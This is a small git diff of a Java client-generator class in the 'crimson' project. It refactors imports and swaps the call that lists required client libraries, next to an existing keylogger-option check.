@@ -27,16 +27,15 @@ import org.slf4j.LoggerFactory;
 import org.zeroturnaround.zip.ZipUtil;
 
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.storage.ClientDB;
 import com.subterranean_security.crimson.core.util.B64Util;
 import com.subterranean_security.crimson.core.util.FileUtil;
-import com.subterranean_security.crimson.core.util.JarUtil;
-import com.subterranean_security.crimson.core.util.JavaLibraries;
 import com.subterranean_security.crimson.core.util.TempUtil;
+import com.subterranean_security.crimson.nucleus.JarUtil;
+import com.subterranean_security.crimson.nucleus.Nucleus;
 
 public class Generator {
 
@@ -119,7 +118,7 @@ public class Generator {
 		new File(tmpZip.getAbsolutePath() + "/java").mkdirs();
 
 		// add jar files
-		for (String lib : JavaLibraries.getRequisites(Instance.CLIENT)) {
+		for (String lib : Nucleus.getInstancePrerequisites(Nucleus.Instance.CLIENT)) {
 			if (lib.equals("c19") && !ic.getKeylogger()) {
 				continue;
 			}
